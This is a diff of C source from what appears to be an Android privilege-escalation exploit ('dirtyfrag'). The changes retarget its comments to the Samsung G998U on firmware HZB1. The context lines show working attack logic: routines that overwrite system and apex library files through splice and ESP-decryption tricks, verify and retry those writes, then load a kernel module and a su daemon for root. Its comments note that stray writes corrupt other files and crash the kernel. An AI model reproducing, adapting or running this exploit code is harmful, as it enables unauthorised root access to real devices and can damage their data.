@@ -374,9 +374,9 @@ static int read_device_versions(int *andr, int *major, int *minor) {
         *andr = atoi(m + 7);
         return (*andr > 0) ? 0 : -1;
     }
-    /* Samsung kernels (e.g. 5.4.242-30958140-abG991BXXSJHZC2) carry no
+    /* Samsung 5.4 kernels (including the G998U HZB1 target) carry no
      * "android" marker: fall back to ro.build.version.release (needs
-     * <sys/system_properties.h>, stable NDK API). o1s/HZC2 -> 15. */
+     * <sys/system_properties.h>, stable NDK API). G998U/HZB1 -> Android 15. */
     {
         char val[92] = { 0 };
         extern int __system_property_get(const char *, char *);
@@ -400,7 +400,7 @@ static char *pad16(const char *data, size_t len, size_t *out_len) {
 }
 
 
-/* o1s: pread-based verify for app-readable targets (apex/system libs).
+/* G998U: pread-based verify for app-readable targets (apex/system libs).
  * Returns bad-block count. */
 static size_t patch_verify_pread(const char *path, const char *payload,
                                  size_t len, size_t foff,
@@ -422,9 +422,9 @@ static size_t patch_verify_pread(const char *path, const char *payload,
     return bad;
 }
 
-/* o1s: write + verify + retry (loopback UDP can drop post-splice packets
+/* G998U: write + verify + retry (loopback UDP can drop post-splice packets
  * before ESP decrypt; recompute IVs from current content each round). */
-static int g_round0_bad = 0; /* o1s: stray-write meter (see below) */
+static int g_round0_bad = 0; /* G998U: stray-write meter (see below) */
 static int patch_checked(const char *path, const char *payload, size_t len,
                          size_t foff, struct Reporter *reporter) {
     for (int round = 0; round < 5; round++) {
@@ -483,7 +483,7 @@ static int patch_ko(struct Reporter *reporter) {
     REPORTLN("* patch #2 round %d (%s <- dirtyfrag.ko, %zu bytes)", round, libcxx_ko_target, ko_len_padded);
     ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
-    /* o1s verify: read back via bridge, memcmp against what we wrote */
+    /* G998U verify: read back via bridge, memcmp against what we wrote */
     if (!ret) {
         size_t bad = 0;
         for (size_t i = 0; i < ko_len_padded; i += 16) {
@@ -684,7 +684,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
 
     rc = 2;
     usleep(500000);
-    /* o1s stray filter: round-0 mismatches mean splice blocks
+    /* G998U stray filter: round-0 mismatches mean splice blocks
      * landed wrong (somewhere!); retries fix the TARGET files but the
      * stray victims stay corrupt (zram BUG_ON #133-139 proven pattern).
      * Abort disasters (>150 first-try bad blocks); the rest proceed at
@@ -728,7 +728,7 @@ Java_df_root_ExploitRunner_nativeRunAll(JNIEnv *env, jclass clz __attribute__((u
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
     time_t t0 = time(NULL);
-    /* o1s: ko FIRST (dfr0), sud SECOND (dfm0). SUCCESS needs BOTH:
+    /* G998U: ko FIRST (dfr0), sud SECOND (dfm0). SUCCESS needs BOTH:
      * ko without daemon = permissive only; daemon without ko = useless. */
     int saw_dfm0 = 0, saw_dfr0 = 0, saw_dfwb = 0;
 
